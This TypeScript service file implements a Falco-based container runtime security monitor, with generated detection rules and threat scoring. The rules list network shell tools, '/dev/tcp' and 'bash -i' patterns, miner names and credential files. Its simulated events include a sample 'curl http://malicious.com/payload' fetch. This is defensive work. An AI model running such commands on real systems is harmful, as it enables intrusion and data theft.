/**
 * Runtime Security Monitor Service
 *
 * Implements container runtime security monitoring using Falco-compatible detection rules
 * and threat analysis for real-time process and network anomaly detection.
 */

import { EventEmitter } from 'events';
import { spawn, ChildProcess } from 'child_process';
import * as fs from 'fs/promises';
import * as path from 'path';
import { auditLoggingService } from './audit-logging';

interface RuntimeSecurityEvent {
  id: string;
  timestamp: Date;
  priority: 'Emergency' | 'Alert' | 'Critical' | 'Error' | 'Warning' | 'Notice' | 'Informational' | 'Debug';
  rule: string;
  message: string;
  tags: string[];
  source: {
    container_id?: string;
    container_name?: string;
    namespace?: string;
    pod_name?: string;
    image?: string;
  };
  process: {
    name?: string;
    pid?: number;
    ppid?: number;
    cmdline?: string;
    user?: string;
    uid?: number;
    gid?: number;
  };
  file?: {
    path?: string;
    name?: string;
    operation?: string;
  };
  network?: {
    connection_type?: string;
    src_ip?: string;
    src_port?: number;
    dest_ip?: string;
    dest_port?: number;
    protocol?: string;
  };
  kubernetes?: {
    pod_name?: string;
    namespace?: string;
    deployment?: string;
    service_account?: string;
  };
}

interface SecurityPolicy {
  id: string;
  name: string;
  description: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  enabled: boolean;
  rule: string;
  action: 'log' | 'alert' | 'block' | 'kill';
  metadata: {
    mitre_attack?: string[];
    cve?: string[];
    compliance?: string[];
  };
}

interface ContainerBaseline {
  containerId: string;
  containerName: string;
  image: string;
  allowedProcesses: Set<string>;
  allowedNetworkConnections: Set<string>;
  allowedFileAccess: Set<string>;
  baselineCreated: Date;
  lastUpdated: Date;
}

interface ThreatAnalysis {
  eventId: string;
  threatLevel: 'low' | 'medium' | 'high' | 'critical';
  confidence: number;
  indicators: string[];
  recommendations: string[];
  automatedResponse?: string;
}

class RuntimeSecurityMonitor extends EventEmitter {
  private falcoProcess: ChildProcess | null = null;
  private policies: Map<string, SecurityPolicy> = new Map();
  private baselines: Map<string, ContainerBaseline> = new Map();
  private threatCache: Map<string, ThreatAnalysis> = new Map();
  private isMonitoring = false;
  private configPath: string;
  private rulesPath: string;

  constructor() {
    super();
    this.configPath = process.env.FALCO_CONFIG_PATH || '/etc/falco';
    this.rulesPath = path.join(this.configPath, 'rules');
    this.initializeDefaultPolicies();
  }

  /**
   * Initialize the runtime security monitor
   */
  async initialize(): Promise<void> {
    try {
      // Create configuration directories
      await this.ensureDirectories();

      // Generate Falco configuration
      await this.generateFalcoConfig();

      // Generate custom rules
      await this.generateCustomRules();

      // Load existing baselines
      await this.loadBaselines();

      console.log('Runtime security monitor initialized successfully');
    } catch (error) {
      console.error('Failed to initialize runtime security monitor:', error);
      throw error;
    }
  }

  /**
   * Start monitoring container runtime activities
   */
  async startMonitoring(): Promise<void> {
    if (this.isMonitoring) {
      throw new Error('Runtime monitoring is already active');
    }

    try {
      // Start Falco process
      await this.startFalcoProcess();

      this.isMonitoring = true;

      // Log monitoring start
      await auditLoggingService.logEvent({
        eventType: 'RUNTIME_MONITORING_STARTED',
        category: 'SECURITY',
        severity: 'LOW',
        source: {
          service: 'runtime-security-monitor',
          version: '1.0.0',
          instance: process.env.HOSTNAME || 'localhost',
          ip: 'localhost'
        },
        actor: { type: 'SYSTEM' },
        target: {
          resource: 'container-runtime',
          resourceType: 'INFRASTRUCTURE'
        },
        action: 'START_MONITORING',
        outcome: 'SUCCESS',
        details: {
          policies: this.policies.size,
          baselines: this.baselines.size
        },
        metadata: {},
        compliance: {
          gdpr: false,
          sox: false,
          iso27001: true,
          pci: true
        }
      });

      console.log('Runtime security monitoring started');
    } catch (error) {
      console.error('Failed to start runtime monitoring:', error);
      throw error;
    }
  }

  /**
   * Stop monitoring
   */
  async stopMonitoring(): Promise<void> {
    if (!this.isMonitoring) {
      return;
    }

    try {
      if (this.falcoProcess) {
        this.falcoProcess.kill('SIGTERM');
        this.falcoProcess = null;
      }

      this.isMonitoring = false;

      // Log monitoring stop
      await auditLoggingService.logEvent({
        eventType: 'RUNTIME_MONITORING_STOPPED',
        category: 'SECURITY',
        severity: 'LOW',
        source: {
          service: 'runtime-security-monitor',
          version: '1.0.0',
          instance: process.env.HOSTNAME || 'localhost',
          ip: 'localhost'
        },
        actor: { type: 'SYSTEM' },
        target: {
          resource: 'container-runtime',
          resourceType: 'INFRASTRUCTURE'
        },
        action: 'STOP_MONITORING',
        outcome: 'SUCCESS',
        details: {},
        metadata: {},
        compliance: {
          gdpr: false,
          sox: false,
          iso27001: true,
          pci: true
        }
      });

      console.log('Runtime security monitoring stopped');
    } catch (error) {
      console.error('Failed to stop runtime monitoring:', error);
      throw error;
    }
  }

  /**
   * Add a security policy
   */
  addPolicy(policy: SecurityPolicy): void {
    this.policies.set(policy.id, policy);
    console.log(`Added security policy: ${policy.name}`);
  }

  /**
   * Remove a security policy
   */
  removePolicy(policyId: string): boolean {
    const removed = this.policies.delete(policyId);
    if (removed) {
      console.log(`Removed security policy: ${policyId}`);
    }
    return removed;
  }

  /**
   * Get all policies
   */
  getPolicies(): SecurityPolicy[] {
    return Array.from(this.policies.values());
  }

  /**
   * Create container baseline
   */
  async createBaseline(containerId: string, containerName: string, image: string): Promise<void> {
    const baseline: ContainerBaseline = {
      containerId,
      containerName,
      image,
      allowedProcesses: new Set(),
      allowedNetworkConnections: new Set(),
      allowedFileAccess: new Set(),
      baselineCreated: new Date(),
      lastUpdated: new Date()
    };

    this.baselines.set(containerId, baseline);

    // Log baseline creation
    await auditLoggingService.logEvent({
      eventType: 'CONTAINER_BASELINE_CREATED',
      category: 'SECURITY',
      severity: 'LOW',
      source: {
        service: 'runtime-security-monitor',
        version: '1.0.0',
        instance: process.env.HOSTNAME || 'localhost',
        ip: 'localhost'
      },
      actor: { type: 'SYSTEM' },
      target: {
        resource: containerId,
        resourceType: 'CONTAINER'
      },
      action: 'CREATE_BASELINE',
      outcome: 'SUCCESS',
      details: {
        containerName,
        image
      },
      metadata: {},
      compliance: {
        gdpr: false,
        sox: false,
        iso27001: true,
        pci: true
      }
    });

    console.log(`Created baseline for container: ${containerName} (${containerId})`);
  }

  /**
   * Process runtime security event
   */
  private async processSecurityEvent(event: RuntimeSecurityEvent): Promise<void> {
    try {
      // Perform threat analysis
      const analysis = await this.analyzeThreat(event);

      // Cache threat analysis
      this.threatCache.set(event.id, analysis);

      // Log security event
      await auditLoggingService.logEvent({
        eventType: 'RUNTIME_SECURITY_EVENT',
        category: 'SECURITY',
        severity: this.mapPriorityToSeverity(event.priority),
        source: {
          service: 'runtime-security-monitor',
          version: '1.0.0',
          instance: process.env.HOSTNAME || 'localhost',
          ip: 'localhost'
        },
        actor: {
          userId: event.process.user,
          type: 'PROCESS'
        },
        target: {
          resource: event.source.container_name || event.source.container_id || 'unknown',
          resourceType: 'CONTAINER'
        },
        action: event.rule,
        outcome: 'DETECTION',
        details: {
          priority: event.priority,
          rule: event.rule,
          message: event.message,
          tags: event.tags,
          threatLevel: analysis.threatLevel,
          confidence: analysis.confidence,
          indicators: analysis.indicators,
          process: event.process,
          file: event.file,
          network: event.network
        },
        metadata: {
          eventId: event.id,
          containerId: event.source.container_id,
          image: event.source.image
        },
        compliance: {
          gdpr: false,
          sox: false,
          iso27001: true,
          pci: true
        }
      });

      // Emit event for real-time processing
      this.emit('securityEvent', event, analysis);

      // Handle automated response if configured
      if (analysis.automatedResponse) {
        await this.executeAutomatedResponse(event, analysis);
      }

      // Send alerts for high-priority events
      if (['Emergency', 'Alert', 'Critical'].includes(event.priority)) {
        this.emit('criticalThreat', event, analysis);
      }

    } catch (error) {
      console.error('Failed to process security event:', error);
    }
  }

  /**
   * Analyze threat based on event data
   */
  private async analyzeThreat(event: RuntimeSecurityEvent): Promise<ThreatAnalysis> {
    const indicators: string[] = [];
    let threatLevel: 'low' | 'medium' | 'high' | 'critical' = 'low';
    let confidence = 0;
    const recommendations: string[] = [];

    // Check against container baseline
    const baseline = this.baselines.get(event.source.container_id || '');
    if (baseline) {
      if (event.process.name && !baseline.allowedProcesses.has(event.process.name)) {
        indicators.push('Unexpected process execution');
        threatLevel = 'medium';
        confidence += 30;
      }

      if (event.network) {
        const connection = `${event.network.dest_ip}:${event.network.dest_port}`;
        if (!baseline.allowedNetworkConnections.has(connection)) {
          indicators.push('Unexpected network connection');
          threatLevel = 'medium';
          confidence += 25;
        }
      }

      if (event.file?.path && !baseline.allowedFileAccess.has(event.file.path)) {
        indicators.push('Unexpected file access');
        confidence += 20;
      }
    }

    // Analyze based on rule tags
    if (event.tags.includes('mitre_persistence')) {
      indicators.push('Persistence technique detected');
      threatLevel = 'high';
      confidence += 40;
    }

    if (event.tags.includes('mitre_privilege_escalation')) {
      indicators.push('Privilege escalation attempt');
      threatLevel = 'critical';
      confidence += 50;
    }

    if (event.tags.includes('cryptocurrency_mining')) {
      indicators.push('Cryptocurrency mining activity');
      threatLevel = 'high';
      confidence += 45;
    }

    // Suspicious process behaviors
    if (event.process.cmdline?.includes('curl') || event.process.cmdline?.includes('wget')) {
      if (event.network) {
        indicators.push('Network download in container');
        confidence += 15;
      }
    }

    // Generate recommendations
    if (threatLevel === 'critical' || threatLevel === 'high') {
      recommendations.push('Isolate container immediately');
      recommendations.push('Investigate process lineage');
      recommendations.push('Check for lateral movement');
    }

    if (indicators.includes('Unexpected process execution')) {
      recommendations.push('Update container baseline');
      recommendations.push('Review container configuration');
    }

    // Determine automated response
    let automatedResponse: string | undefined;
    if (threatLevel === 'critical' && confidence > 80) {
      automatedResponse = 'quarantine_container';
    } else if (threatLevel === 'high' && confidence > 70) {
      automatedResponse = 'alert_security_team';
    }

    return {
      eventId: event.id,
      threatLevel,
      confidence: Math.min(confidence, 100),
      indicators,
      recommendations,
      automatedResponse
    };
  }

  /**
   * Execute automated response based on threat analysis
   */
  private async executeAutomatedResponse(event: RuntimeSecurityEvent, analysis: ThreatAnalysis): Promise<void> {
    try {
      switch (analysis.automatedResponse) {
        case 'quarantine_container':
          if (event.source.container_id) {
            await this.quarantineContainer(event.source.container_id);
          }
          break;
        case 'alert_security_team':
          await this.alertSecurityTeam(event, analysis);
          break;
        case 'kill_process':
          if (event.process.pid) {
            await this.killProcess(event.process.pid, event.source.container_id);
          }
          break;
      }
    } catch (error) {
      console.error('Failed to execute automated response:', error);
    }
  }

  /**
   * Quarantine a container
   */
  private async quarantineContainer(containerId: string): Promise<void> {
    try {
      // In a real implementation, this would interact with Docker/Kubernetes APIs
      console.log(`QUARANTINE: Container ${containerId} has been quarantined due to critical security threat`);

      // Log quarantine action
      await auditLoggingService.logEvent({
        eventType: 'CONTAINER_QUARANTINED',
        category: 'SECURITY',
        severity: 'HIGH',
        source: {
          service: 'runtime-security-monitor',
          version: '1.0.0',
          instance: process.env.HOSTNAME || 'localhost',
          ip: 'localhost'
        },
        actor: { type: 'SYSTEM' },
        target: {
          resource: containerId,
          resourceType: 'CONTAINER'
        },
        action: 'QUARANTINE',
        outcome: 'SUCCESS',
        details: {
          reason: 'Critical security threat detected'
        },
        metadata: {},
        compliance: {
          gdpr: false,
          sox: false,
          iso27001: true,
          pci: true
        }
      });
    } catch (error) {
      console.error('Failed to quarantine container:', error);
    }
  }

  /**
   * Alert security team
   */
  private async alertSecurityTeam(event: RuntimeSecurityEvent, analysis: ThreatAnalysis): Promise<void> {
    // This would integrate with alerting systems (Slack, PagerDuty, etc.)
    console.log(`SECURITY ALERT: High-priority threat detected in container ${event.source.container_name}`);
    console.log(`Threat Level: ${analysis.threatLevel}, Confidence: ${analysis.confidence}%`);
    console.log(`Indicators: ${analysis.indicators.join(', ')}`);
  }

  /**
   * Kill a specific process
   */
  private async killProcess(pid: number, containerId?: string): Promise<void> {
    try {
      console.log(`KILL PROCESS: Terminating PID ${pid} in container ${containerId || 'unknown'}`);
      // In a real implementation, this would use container runtime APIs
    } catch (error) {
      console.error('Failed to kill process:', error);
    }
  }

  /**
   * Initialize default security policies
   */
  private initializeDefaultPolicies(): void {
    const defaultPolicies: SecurityPolicy[] = [
      {
        id: 'policy-001',
        name: 'Cryptocurrency Mining Detection',
        description: 'Detect cryptocurrency mining processes in containers',
        severity: 'high',
        enabled: true,
        rule: 'cryptocurrency_mining',
        action: 'alert',
        metadata: {
          mitre_attack: ['T1496'],
          compliance: ['iso27001']
        }
      },
      {
        id: 'policy-002',
        name: 'Privilege Escalation Detection',
        description: 'Detect privilege escalation attempts',
        severity: 'critical',
        enabled: true,
        rule: 'privilege_escalation',
        action: 'block',
        metadata: {
          mitre_attack: ['T1068', 'T1548'],
          compliance: ['iso27001', 'pci']
        }
      },
      {
        id: 'policy-003',
        name: 'Suspicious Network Activity',
        description: 'Detect unexpected network connections',
        severity: 'medium',
        enabled: true,
        rule: 'suspicious_network',
        action: 'log',
        metadata: {
          mitre_attack: ['T1071'],
          compliance: ['iso27001']
        }
      },
      {
        id: 'policy-004',
        name: 'Container Escape Detection',
        description: 'Detect container escape attempts',
        severity: 'critical',
        enabled: true,
        rule: 'container_escape',
        action: 'kill',
        metadata: {
          mitre_attack: ['T1611'],
          compliance: ['iso27001', 'pci']
        }
      }
    ];

    defaultPolicies.forEach(policy => this.policies.set(policy.id, policy));
  }

  /**
   * Ensure required directories exist
   */
  private async ensureDirectories(): Promise<void> {
    try {
      await fs.mkdir(this.configPath, { recursive: true });
      await fs.mkdir(this.rulesPath, { recursive: true });
    } catch (error) {
      console.error('Failed to create directories:', error);
      throw error;
    }
  }

  /**
   * Generate Falco configuration file
   */
  private async generateFalcoConfig(): Promise<void> {
    const config = `
# Falco Configuration for Urnlabs Runtime Security Monitor
---
rules_file:
  - /etc/falco/falco_rules.yaml
  - /etc/falco/rules/custom_rules.yaml

json_output: true
json_include_output_property: true
json_include_tags_property: true

priority: debug
buffered_outputs: false

outputs:
  rate: 1
  max_burst: 1000

syslog_output:
  enabled: false

file_output:
  enabled: true
  keep_alive: false
  filename: /var/log/falco/events.log

stdout_output:
  enabled: true

grpc_output:
  enabled: false

webserver:
  enabled: false

http_output:
  enabled: false

load_plugins: []

plugins:
  - name: json
    library_path: libjson.so
    init_config: ""
    open_params: ""

syscall_event_drops:
  actions:
    - log
    - alert
  rate: 0.03333
  max_burst: 10

base_syscalls:
  custom_set: []
  repair: false

modern_bpf:
  cpus_for_each_syscall_buffer: 2

engine:
  kind: modern_bpf
`;

    await fs.writeFile(path.join(this.configPath, 'falco.yaml'), config.trim());
  }

  /**
   * Generate custom Falco rules
   */
  private async generateCustomRules(): Promise<void> {
    const customRules = `
# Custom Falco Rules for Urnlabs
---
- required_engine_version: 0.35.0

- list: urnlabs_containers
  items: [urnlabs-api, urnlabs-gateway, urnlabs-agents, urnlabs-dashboard]

- macro: urnlabs_container
  condition: container and container.name in (urnlabs_containers)

# Cryptocurrency Mining Detection
- rule: Cryptocurrency Mining Activity
  desc: Detect cryptocurrency mining processes
  condition: >
    spawned_process and
    (proc.name in (xmrig, ethminer, cgminer, bfgminer, t-rex, phoenixminer, teamredminer, gminer, bminer, lolminer, nanominer, nbminer, claymore, nicehash) or
     proc.cmdline contains "-o stratum" or
     proc.cmdline contains "mining.pool" or
     proc.cmdline contains "--algorithm" or
     proc.cmdline contains "--cuda" or
     proc.cmdline contains "--opencl")
  output: >
    Cryptocurrency mining activity detected
    (user=%user.name command=%proc.cmdline container=%container.name image=%container.image.repository)
  priority: ALERT
  tags: [cryptocurrency_mining, mitre_resource_hijacking, T1496]

# Privilege Escalation Detection
- rule: Privilege Escalation Attempt
  desc: Detect privilege escalation attempts
  condition: >
    urnlabs_container and
    (spawned_process and proc.name in (sudo, su, doas, pkexec) or
     (open_write and fd.name startswith /etc/passwd) or
     (open_write and fd.name startswith /etc/shadow) or
     (spawned_process and proc.args contains "chmod +s"))
  output: >
    Privilege escalation attempt detected
    (user=%user.name command=%proc.cmdline container=%container.name image=%container.image.repository)
  priority: CRITICAL
  tags: [privilege_escalation, mitre_privilege_escalation, T1068, T1548]

# Suspicious Network Activity
- rule: Unexpected Network Connection
  desc: Detect unexpected outbound network connections
  condition: >
    urnlabs_container and
    (outbound and not fd.net.daddr in (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.1)) and
    (fd.net.dport != 80 and fd.net.dport != 443 and fd.net.dport != 53)
  output: >
    Unexpected network connection
    (user=%user.name command=%proc.cmdline connection=%fd.net.daddr:%fd.net.dport container=%container.name)
  priority: WARNING
  tags: [suspicious_network, mitre_command_and_control, T1071]

# Container Escape Detection
- rule: Container Escape Attempt
  desc: Detect container escape attempts
  condition: >
    urnlabs_container and
    (spawned_process and proc.name in (docker, kubectl, runc, ctr, crictl) or
     (open_read and fd.name startswith /proc/1/root) or
     (open_read and fd.name startswith /host) or
     (spawned_process and proc.args contains "nsenter"))
  output: >
    Container escape attempt detected
    (user=%user.name command=%proc.cmdline container=%container.name image=%container.image.repository)
  priority: CRITICAL
  tags: [container_escape, mitre_escape_to_host, T1611]

# File System Monitoring
- rule: Sensitive File Access
  desc: Detect access to sensitive files
  condition: >
    urnlabs_container and
    ((open_read or open_write) and
     (fd.name startswith /etc/passwd or fd.name startswith /etc/shadow or
      fd.name startswith /root/.ssh or fd.name startswith /home/.ssh or
      fd.name startswith /etc/ssl or fd.name startswith /var/lib/docker))
  output: >
    Sensitive file access
    (user=%user.name file=%fd.name command=%proc.cmdline container=%container.name)
  priority: WARNING
  tags: [sensitive_file_access, mitre_credential_access, T1552]

# Process Monitoring
- rule: Suspicious Process Execution
  desc: Detect suspicious process execution
  condition: >
    urnlabs_container and
    spawned_process and
    (proc.name in (nc, netcat, ncat, socat, telnet, wget, curl) or
     proc.cmdline contains "/dev/tcp" or
     proc.cmdline contains "bash -i" or
     proc.cmdline contains "sh -i" or
     proc.cmdline contains "python -c" or
     proc.cmdline contains "perl -e" or
     proc.cmdline contains "ruby -e")
  output: >
    Suspicious process execution
    (user=%user.name command=%proc.cmdline container=%container.name image=%container.image.repository)
  priority: WARNING
  tags: [suspicious_process, mitre_execution, T1059]
`;

    await fs.writeFile(path.join(this.rulesPath, 'custom_rules.yaml'), customRules.trim());
  }

  /**
   * Start Falco process
   */
  private async startFalcoProcess(): Promise<void> {
    return new Promise((resolve, reject) => {
      // For development/testing, we'll simulate Falco output
      // In production, this would spawn the actual Falco process
      if (process.env.NODE_ENV === 'development') {
        this.simulateFalcoEvents();
        resolve();
        return;
      }

      const falcoPath = process.env.FALCO_PATH || 'falco';
      const configFile = path.join(this.configPath, 'falco.yaml');

      this.falcoProcess = spawn(falcoPath, ['-c', configFile], {
        stdio: ['pipe', 'pipe', 'pipe']
      });

      this.falcoProcess.stdout?.on('data', (data) => {
        const lines = data.toString().split('\n').filter(line => line.trim());
        lines.forEach(line => {
          try {
            const event = JSON.parse(line);
            this.handleFalcoEvent(event);
          } catch (error) {
            console.error('Failed to parse Falco event:', error);
          }
        });
      });

      this.falcoProcess.stderr?.on('data', (data) => {
        console.error('Falco stderr:', data.toString());
      });

      this.falcoProcess.on('error', (error) => {
        console.error('Falco process error:', error);
        reject(error);
      });

      this.falcoProcess.on('exit', (code) => {
        console.log(`Falco process exited with code ${code}`);
        this.falcoProcess = null;
      });

      // Give Falco a moment to start
      setTimeout(() => resolve(), 2000);
    });
  }

  /**
   * Handle Falco event
   */
  private handleFalcoEvent(rawEvent: any): void {
    try {
      const event: RuntimeSecurityEvent = {
        id: `event-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
        timestamp: new Date(rawEvent.time),
        priority: rawEvent.priority || 'Warning',
        rule: rawEvent.rule || 'unknown',
        message: rawEvent.output || rawEvent.output_fields?.message || '',
        tags: rawEvent.tags || [],
        source: {
          container_id: rawEvent.output_fields?.['container.id'],
          container_name: rawEvent.output_fields?.['container.name'],
          namespace: rawEvent.output_fields?.['k8s.ns.name'],
          pod_name: rawEvent.output_fields?.['k8s.pod.name'],
          image: rawEvent.output_fields?.['container.image.repository']
        },
        process: {
          name: rawEvent.output_fields?.['proc.name'],
          pid: rawEvent.output_fields?.['proc.pid'],
          ppid: rawEvent.output_fields?.['proc.ppid'],
          cmdline: rawEvent.output_fields?.['proc.cmdline'],
          user: rawEvent.output_fields?.['user.name'],
          uid: rawEvent.output_fields?.['user.uid'],
          gid: rawEvent.output_fields?.['user.gid']
        },
        file: {
          path: rawEvent.output_fields?.['fd.name'],
          name: rawEvent.output_fields?.['fd.name']?.split('/').pop(),
          operation: rawEvent.output_fields?.['evt.type']
        },
        network: {
          connection_type: rawEvent.output_fields?.['fd.type'],
          src_ip: rawEvent.output_fields?.['fd.net.saddr'],
          src_port: rawEvent.output_fields?.['fd.net.sport'],
          dest_ip: rawEvent.output_fields?.['fd.net.daddr'],
          dest_port: rawEvent.output_fields?.['fd.net.dport'],
          protocol: rawEvent.output_fields?.['fd.net.proto']
        },
        kubernetes: {
          pod_name: rawEvent.output_fields?.['k8s.pod.name'],
          namespace: rawEvent.output_fields?.['k8s.ns.name'],
          deployment: rawEvent.output_fields?.['k8s.deployment.name'],
          service_account: rawEvent.output_fields?.['k8s.serviceaccount.name']
        }
      };

      this.processSecurityEvent(event);
    } catch (error) {
      console.error('Failed to handle Falco event:', error);
    }
  }

  /**
   * Simulate Falco events for development
   */
  private simulateFalcoEvents(): void {
    const simulateEvent = () => {
      const events = [
        {
          rule: 'Cryptocurrency Mining Activity',
          priority: 'ALERT',
          message: 'Cryptocurrency mining activity detected (user=root command=xmrig --donate-level=1 container=urnlabs-api)',
          tags: ['cryptocurrency_mining', 'mitre_resource_hijacking', 'T1496'],
          container_name: 'urnlabs-api',
          process_name: 'xmrig'
        },
        {
          rule: 'Suspicious Process Execution',
          priority: 'WARNING',
          message: 'Suspicious process execution (user=app command=curl http://malicious.com/payload container=urnlabs-gateway)',
          tags: ['suspicious_process', 'mitre_execution', 'T1059'],
          container_name: 'urnlabs-gateway',
          process_name: 'curl'
        },
        {
          rule: 'Unexpected Network Connection',
          priority: 'WARNING',
          message: 'Unexpected network connection (user=app connection=185.234.218.42:4444 container=urnlabs-agents)',
          tags: ['suspicious_network', 'mitre_command_and_control', 'T1071'],
          container_name: 'urnlabs-agents',
          process_name: 'node'
        }
      ];

      const randomEvent = events[Math.floor(Math.random() * events.length)];

      const event: RuntimeSecurityEvent = {
        id: `sim-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
        timestamp: new Date(),
        priority: randomEvent.priority as any,
        rule: randomEvent.rule,
        message: randomEvent.message,
        tags: randomEvent.tags,
        source: {
          container_id: `container-${Math.random().toString(36).substr(2, 12)}`,
          container_name: randomEvent.container_name,
          image: `urnlabs/${randomEvent.container_name}:latest`
        },
        process: {
          name: randomEvent.process_name,
          pid: Math.floor(Math.random() * 30000) + 1000,
          cmdline: randomEvent.message.match(/command=([^)]+)/)?.[1] || randomEvent.process_name,
          user: 'app',
          uid: 1000,
          gid: 1000
        }
      };

      this.processSecurityEvent(event);
    };

    // Simulate events every 30-60 seconds
    const scheduleNext = () => {
      setTimeout(() => {
        if (this.isMonitoring) {
          simulateEvent();
          scheduleNext();
        }
      }, Math.random() * 30000 + 30000);
    };

    scheduleNext();
  }

  /**
   * Load existing baselines
   */
  private async loadBaselines(): Promise<void> {
    // In a real implementation, this would load from persistent storage
    console.log('Loading container baselines...');
  }

  /**
   * Map Falco priority to audit log severity
   */
  private mapPriorityToSeverity(priority: string): 'LOW' | 'MEDIUM' | 'HIGH' {
    switch (priority.toUpperCase()) {
      case 'EMERGENCY':
      case 'ALERT':
      case 'CRITICAL':
        return 'HIGH';
      case 'ERROR':
      case 'WARNING':
        return 'MEDIUM';
      default:
        return 'LOW';
    }
  }

  /**
   * Get runtime security statistics
   */
  getStatistics(): any {
    return {
      monitoring: this.isMonitoring,
      policies: {
        total: this.policies.size,
        enabled: Array.from(this.policies.values()).filter(p => p.enabled).length
      },
      baselines: this.baselines.size,
      threatCache: this.threatCache.size,
      uptime: process.uptime()
    };
  }
}

export const runtimeSecurityMonitor = new RuntimeSecurityMonitor();
export type { RuntimeSecurityEvent, SecurityPolicy, ContainerBaseline, ThreatAnalysis };